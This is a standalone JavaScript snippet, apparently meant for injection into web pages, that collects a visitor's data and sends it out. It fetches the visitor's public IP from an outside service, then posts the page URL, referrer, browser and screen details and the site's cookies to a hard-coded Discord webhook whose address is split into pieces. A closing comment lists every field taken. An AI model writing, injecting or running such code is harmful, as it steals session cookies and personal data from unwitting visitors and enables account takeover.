var ipad;
try {
    var ip = new XMLHttpRequest();
    ip.open("GET","http://icanhazip.com/",false);
    ip.send(null);
    ipad = ip.responseText;
} catch (err) {
    ipad = "error loading IP"
}
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://discord.com/api/webhooks/8039505"+"82087548999/YBfZ5hhHVRMYnbbCJE9gjMg99SwC96cid9"+"kkv9My_5MrhHZ0MxvmoYl4-rPVovs-cGyW", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    "content": "Data from " + window.location.href + " " + ipad + "\n" + 
      [new Date(), document.referrer, history.length,
       navigator.appName, navigator.product, navigator.appVersion, navigator.userAgent, navigator.language, navigator.onLine, navigator.platform, navigator.javaEnabled(), navigator.cookieEnabled,
       document.cookie, decodeURIComponent(document.cookie.split(";")),
       screen.width, screen.height, document.width, document.height, innerWidth, innerHeight, screen.availWidth, screen.availHeight, screen.colorDepth, screen.pixelDepth].join("\n")
}));

// time opened, referrer, previous sites, browser name, browser engine, browser version, browser version 2, language, browser online, browser platform, java enableed, data cookies enabled, data cookies, data cookies 2, screen width, screen height, document width, document height, inner width, inner height, avail width, avail height, color depth, pixel depth
